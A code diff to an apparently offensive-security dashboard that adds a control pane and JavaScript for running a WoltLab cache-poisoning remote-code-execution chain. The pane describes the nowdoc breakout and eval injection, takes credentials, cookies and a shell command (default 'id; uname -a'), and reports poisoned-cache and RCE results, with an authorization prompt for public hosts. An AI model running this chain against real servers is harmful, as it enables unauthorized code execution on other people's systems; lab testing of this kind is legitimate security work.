@@ -3676,7 +3676,7 @@
                     <span class="icon">🛡️</span> DFIR Response <span style="margin-left:auto; font-size:10px; opacity:0.6;">↗</span>
                 </a>
                                 <a class="nav-item" href="strix.html" title="Strix — autonomous AI pentesters (K:codingappDevstrix)" style="text-decoration:none;">
-            <a class="nav-item" href="search.html" title="Cairn  state-space search over a fact-intent graph"><span class="icon">>�</span> Cairn Search <span style="margin-left:auto; font-size:9px; letter-spacing:0.6px; opacity:0.7;">STATE SEARCH</span></a>
+            <a class="nav-item" href="search.html" title="Cairn  state-space search over a fact-intent graph"><span class="icon">>�</span> Cairn Search <span style="margin-left:auto; font-size:9px; letter-spacing:0.6px; opacity:0.7;">STATE SEARCH</span></a>
                     <span class="icon">🦊</span> Strix <span style="margin-left:auto; font-size:9px; letter-spacing:0.6px; opacity:0.7;">AI PENTEST</span>
                 </a>
 <a class="nav-item" href="terminal.html" style="text-decoration:none;">
@@ -4129,6 +4129,59 @@
                                 <div class="hunt-swarm-grid" id="huntSwarmGrid"></div>
                                 <div class="squad-brief" id="huntSquadBrief"></div>
                             </section>
+                        </div>
+                        <div id="rce-chain" style="margin:14px 0; border:1px solid rgba(255,71,87,0.35); border-radius:8px; background:linear-gradient(180deg, rgba(255,71,87,0.06), rgba(10,12,18,0.4)); padding:12px 14px;">
+                            <div class="ops-card-title" style="margin-bottom:6px;">
+                                <span style="color:#ff6b78;">⚡ RCE CHAIN — WoltLab cache poison · CVE-2026-79362</span>
+                                <span id="wcrChainState" style="color:#7a7f87;">idle</span>
+                            </div>
+                            <div style="font-size:10.5px;color:#7a7f87;margin:2px 0 10px;">
+                                Automated kill chain: fingerprint → authenticate → inject nowdoc breakout → trigger rebuild → canary → <b style="color:#ff6b78;">command exec</b> through the poisoned cache include.
+                                Sink: DiskCacheSource::set() 6.1.x writes <code style="color:#9baeb8;">return &lt;&lt;&lt;'EOT'</code> + serialize(value) unescaped; <code style="color:#9baeb8;">EOT &amp;&amp; eval(...)</code> chains into the first return (PHP 7.3+ flexible close — WSC 6.x ships PHP ≥ 8.1).
+                                <b>CANARY</b> is always allowed (md5 proof, no command channel compiled in); <b>RCE</b> on a public host requires the authorization ack. Lab container <code style="color:#9baeb8;">wcf-lab :8095</code> runs the REAL 6.1.15 sink.
+                            </div>
+                            <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:flex-end;">
+                                <label style="display:flex;flex-direction:column;gap:2px;font-size:9px;color:var(--brand);text-transform:uppercase;letter-spacing:1px;">Target
+                                    <input id="wcrTarget" type="text" placeholder="http://127.0.0.1:8095" value="http://127.0.0.1:8095" spellcheck="false" style="width:220px;padding:4px 8px;font-size:12px;font-family:'JetBrains Mono',monospace;color:#cfe8d8;background:rgba(0,0,0,0.35);border:1px solid rgba(255,71,87,0.3);border-radius:5px;outline:none;">
+                                </label>
+                                <label style="display:flex;flex-direction:column;gap:2px;font-size:9px;color:var(--brand);text-transform:uppercase;letter-spacing:1px;">Mode
+                                    <select id="wcrMode" onchange="wcrModeChanged()" style="padding:4px 6px;font-size:12px;font-family:'JetBrains Mono',monospace;color:#fff;background:rgba(0,0,0,0.35);border:1px solid rgba(255,71,87,0.3);border-radius:5px;outline:none;">
+                                        <option value="canary">🧪 CANARY — poison proof only</option>
+                                        <option value="rce">💥 RCE — full command channel</option>
+                                    </select>
+                                </label>
+                                <label style="display:flex;flex-direction:column;gap:2px;font-size:9px;color:var(--brand);text-transform:uppercase;letter-spacing:1px;">User
+                                    <input id="wcrUser" type="text" placeholder="optional" autocomplete="off" style="width:120px;padding:4px 8px;font-size:12px;font-family:'JetBrains Mono',monospace;color:#cfe8d8;background:rgba(0,0,0,0.35);border:1px solid rgba(255,71,87,0.3);border-radius:5px;outline:none;">
+                                </label>
+                                <label style="display:flex;flex-direction:column;gap:2px;font-size:9px;color:var(--brand);text-transform:uppercase;letter-spacing:1px;">Pass
+                                    <input id="wcrPass" type="password" placeholder="optional" autocomplete="off" style="width:120px;padding:4px 8px;font-size:12px;font-family:'JetBrains Mono',monospace;color:#cfe8d8;background:rgba(0,0,0,0.35);border:1px solid rgba(255,71,87,0.3);border-radius:5px;outline:none;">
+                                </label>
+                                <label style="display:flex;flex-direction:column;gap:2px;font-size:9px;color:var(--brand);text-transform:uppercase;letter-spacing:1px;">Session cookie
+                                    <input id="wcrCookie" type="text" placeholder="k=v; k2=v2 (overrides login)" autocomplete="off" style="width:200px;padding:4px 8px;font-size:12px;font-family:'JetBrains Mono',monospace;color:#cfe8d8;background:rgba(0,0,0,0.35);border:1px solid rgba(255,71,87,0.3);border-radius:5px;outline:none;">
+                                </label>
+                                <label id="wcrCmdRow" style="display:none;flex-direction:column;gap:2px;font-size:9px;color:#ff6b78;text-transform:uppercase;letter-spacing:1px;">Command
+                                    <input id="wcrCmd" type="text" value="id; uname -a" spellcheck="false" style="width:220px;padding:4px 8px;font-size:12px;font-family:'JetBrains Mono',monospace;color:#ffd7da;background:rgba(0,0,0,0.35);border:1px solid rgba(255,71,87,0.45);border-radius:5px;outline:none;">
+                                </label>
+                                <button id="wcrRunBtn" type="button" onclick="runWoltlabChain()" style="padding:6px 16px;font-size:12px;font-weight:700;color:#0a0c12;background:linear-gradient(90deg,#ff4757,#ff6b45);border:none;border-radius:6px;cursor:pointer;">▶ RUN CHAIN</button>
+                            </div>
+                            <div id="wcrAckRow" style="display:none;margin-top:8px;font-size:11px;color:#ff8a8a;">
+                                ⚠ Public host + RCE mode: type <code style="background:rgba(0,0,0,0.4);padding:1px 5px;border-radius:3px;">I am authorized to test this target</code> to arm:
+                                <input id="wcrAck" type="text" placeholder="authorization acknowledgment" autocomplete="off" style="width:280px;padding:3px 8px;font-size:11px;font-family:'JetBrains Mono',monospace;color:#ffd7da;background:rgba(0,0,0,0.35);border:1px solid rgba(255,71,87,0.45);border-radius:5px;outline:none;margin-left:6px;">
+                            </div>
+                            <details style="margin-top:8px;">
+                                <summary style="font-size:10px;color:#5a5f67;cursor:pointer;">advanced — injection endpoint override</summary>
+                                <div style="display:flex;gap:8px;margin-top:6px;align-items:flex-end;">
+                                    <label style="display:flex;flex-direction:column;gap:2px;font-size:9px;color:#7a7f87;">PATH
+                                        <input id="wcrPath" type="text" placeholder="/index.php?account-management/" spellcheck="false" style="width:220px;padding:4px 8px;font-size:11px;font-family:'JetBrains Mono',monospace;color:#cfe8d8;background:rgba(0,0,0,0.35);border:1px solid #1e4053;border-radius:5px;outline:none;">
+                                    </label>
+                                    <label style="display:flex;flex-direction:column;gap:2px;font-size:9px;color:#7a7f87;">FIELD
+                                        <input id="wcrField" type="text" placeholder="about" spellcheck="false" style="width:110px;padding:4px 8px;font-size:11px;font-family:'JetBrains Mono',monospace;color:#cfe8d8;background:rgba(0,0,0,0.35);border:1px solid #1e4053;border-radius:5px;outline:none;">
+                                    </label>
+                                    <button type="button" onclick="previewWcrPayload()" style="padding:4px 10px;font-size:11px;color:#9baeb8;background:rgba(0,0,0,0.35);border:1px solid #1e4053;border-radius:5px;cursor:pointer;">preview payload</button>
+                                </div>
+                            </details>
+                            <div id="wcrStages" style="margin-top:10px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.6;"></div>
+                            <div id="wcrOutput" style="display:none;margin-top:8px;background:rgba(0,0,0,0.45);border:1px solid rgba(255,71,87,0.3);border-radius:6px;padding:8px 10px;font-family:'JetBrains Mono',monospace;font-size:11px;color:#d8ffe9;white-space:pre-wrap;word-break:break-word;max-height:260px;overflow-y:auto;"></div>
                         </div>
                         <div class="cognition-board" id="swarmCognitionBoard">
                             <section class="cog-panel">
@@ -4708,7 +4761,7 @@
                                         <!-- CVE Exploit Packages  live from /api/cves/payloads (src/tools/cve-payloads.ts). Lab and receipted targets only. -->
                     <div class="card" id="cvePackagesCard" style="margin-bottom: 18px; border: 1px solid rgba(47,255,210,0.3);">
                         <div class="card-header">
-                            <h3 class="card-title">>� CVE Exploit Packages  WAR ROOM</h3>
+                            <h3 class="card-title">>� CVE Exploit Packages  WAR ROOM</h3>
                             <span class="tag" id="cvePackagesCount">--</span>
                         </div>
                         <p style="font-size: 11px; color: #888; margin-bottom: 8px;">Packages ride the Target Map KEV correlation: a receipted target running an affected PHP build is in scope; everything else stays in the lab. <span style="color:#ffaa00; font-family:'JetBrains Mono',monospace;">lab-validate</span> = vector template, verify in the lab first; <span style="color:#2fffd2; font-family:'JetBrains Mono',monospace;">confirmed-poc</span> = canonical public PoC. NEW = this week's php-src advisories.</p>
@@ -30189,7 +30242,104 @@ Be specific and actionable. Format as structured JSON.`;
     </script>
 <script src="sounds.js"></script>
 <script src="findings-sort.js"></script>
-<script src="cve-vault.js"></script>
+<script>
+    // ── RCE CHAIN pane (CVE-2026-79362) ──────────────────────────────────────
+    function wcrApiBase() {
+        try { if (window.T3MP3ST_API && typeof T3MP3ST_API.getBase === 'function') return T3MP3ST_API.getBase(); } catch (e) {}
+        return 'http://' + (window.location.hostname || '127.0.0.1') + ':3333';
+    }
+    function wcrEsc(s) {
+        return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
+            return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+        });
+    }
+    function wcrModeChanged() {
+        var mode = document.getElementById('wcrMode').value;
+        var publicHost = /https?:\/\/(?!127\.|localhost|0\.0\.0\.0|\[::1\]|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/i.test(document.getElementById('wcrTarget').value);
+        document.getElementById('wcrCmdRow').style.display = mode === 'rce' ? 'flex' : 'none';
+        document.getElementById('wcrAckRow').style.display = (mode === 'rce' && publicHost) ? 'block' : 'none';
+    }
+    function wcrStageLine(s) {
+        var color = s.ok ? '#2fffd2' : '#ff4757';
+        var icon = s.ok ? '✓' : '✗';
+        var ev = s.evidence ? ' <span style="color:#5a5f67;">— ' + wcrEsc(String(s.evidence).slice(0, 160)) + '</span>' : '';
+        return '<div style="color:' + color + ';">[' + icon + '] ' + wcrEsc(s.stage) +
+            ' <span style="color:#5a5f67;">(' + s.ms + 'ms)</span> ' + wcrEsc(s.detail) + ev + '</div>';
+    }
+    async function runWoltlabChain() {
+        var stateEl = document.getElementById('wcrChainState');
+        var stagesEl = document.getElementById('wcrStages');
+        var outEl = document.getElementById('wcrOutput');
+        var btn = document.getElementById('wcrRunBtn');
+        var body = {
+            target: document.getElementById('wcrTarget').value.trim(),
+            mode: document.getElementById('wcrMode').value,
+            command: document.getElementById('wcrCmd').value.trim() || undefined,
+            username: document.getElementById('wcrUser').value.trim() || undefined,
+            password: document.getElementById('wcrPass').value || undefined,
+            cookie: document.getElementById('wcrCookie').value.trim() || undefined,
+            authorize: document.getElementById('wcrAck').value.trim() || undefined,
+            injectPath: document.getElementById('wcrPath').value.trim() || undefined,
+            injectField: document.getElementById('wcrField').value.trim() || undefined,
+        };
+        if (!body.target) { stateEl.textContent = '✗ target required'; stateEl.style.color = '#ff4757'; return; }
+        stateEl.textContent = 'running…'; stateEl.style.color = '#ffa502';
+        stagesEl.innerHTML = '<div style="color:#ffa502;">[▶] chain dispatched — fingerprinting…</div>';
+        outEl.style.display = 'none';
+        btn.disabled = true; btn.textContent = '⏳ RUNNING';
+        var t0 = Date.now();
+        try {
+            var res = await fetch(wcrApiBase() + '/api/exploit/woltlab-chain', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body),
+            });
+            var j = await res.json();
+            var secs = ((Date.now() - t0) / 1000).toFixed(1);
+            if (j.error && (!j.stages || !j.stages.length)) {
+                stagesEl.innerHTML = '<div style="color:#ff4757;">[✗] refused — ' + wcrEsc(j.error) + '</div>';
+                stateEl.textContent = '✗ refused (' + secs + 's)'; stateEl.style.color = '#ff4757';
+                return;
+            }
+            var html = '';
+            (j.stages || []).forEach(function (s) { html += wcrStageLine(s); });
+            if (j.vulnerable === true) html += '<div style="color:#2fffd2;">[✓] classified VULNERABLE — version ' + wcrEsc(j.version) + '</div>';
+            else if (j.vulnerable === false) html += '<div style="color:#ffa502;">[!] version ' + wcrEsc(j.version) + ' classifies PATCHED — canary is ground truth regardless</div>';
+            if (j.poisoned) html += '<div style="color:#2fffd2;font-weight:bold;">[☣] CACHE POISONED — attacker PHP runs inside the app include</div>';
+            if (j.rce) html += '<div style="color:#ff6b78;font-weight:bold;">[💥] RCE CONFIRMED — \'' + wcrEsc(j.command) + '\'</div>';
+            stagesEl.innerHTML = html;
+            if (j.output) { outEl.textContent = '$ ' + j.command + '\n' + j.output; outEl.style.display = 'block'; }
+            (j.receipts || []).forEach(function (r) { console.log('[RCE-CHAIN receipt]', r); });
+            stateEl.textContent = j.error ? '⚠ stopped — ' + j.error : (j.rce ? '💥 RCE' : (j.poisoned ? '☣ poisoned (canary)' : '✗ no poison')) + ' (' + secs + 's)';
+            stateEl.style.color = j.rce ? '#ff6b78' : (j.poisoned ? '#2fffd2' : '#ff4757');
+        } catch (e) {
+            stagesEl.innerHTML = '<div style="color:#ff4757;">[✗] chain failed — ' + wcrEsc(e.message) + '</div>';
+            stateEl.textContent = '✗ failed'; stateEl.style.color = '#ff4757';
+        } finally {
+            btn.disabled = false; btn.textContent = '▶ RUN CHAIN';
+        }
+    }
+    async function previewWcrPayload() {
+        var mode = document.getElementById('wcrMode').value;
+        try {
+            var res = await fetch(wcrApiBase() + '/api/exploit/woltlab-chain/payload-preview?mode=' + mode);
+            var j = await res.json();
+            var outEl = document.getElementById('wcrOutput');
+            outEl.textContent = '[' + j.mode + ' breakout, ' + j.bytes + 'B]\n' + j.payload;
+            outEl.style.display = 'block';
+        } catch (e) { console.error(e); }
+    }
+    document.getElementById('wcrMode').addEventListener('change', wcrModeChanged);
+    document.getElementById('wcrTarget').addEventListener('input', wcrModeChanged);
+    wcrModeChanged();
+    if (/rce-chain/.test(location.hash)) {
+        setTimeout(function () {
+            var el = document.getElementById('rce-chain');
+            if (el) { el.scrollIntoView({ behavior: 'smooth', block: 'center' }); el.style.boxShadow = '0 0 24px rgba(255,71,87,0.5)'; }
+        }, 400);
+    }
+</script>
+
+    <script src="cve-vault.js"></script>
 
 <script>
 // CVE Exploit Packages  live from /api/cves/payloads. NEW = published this week.
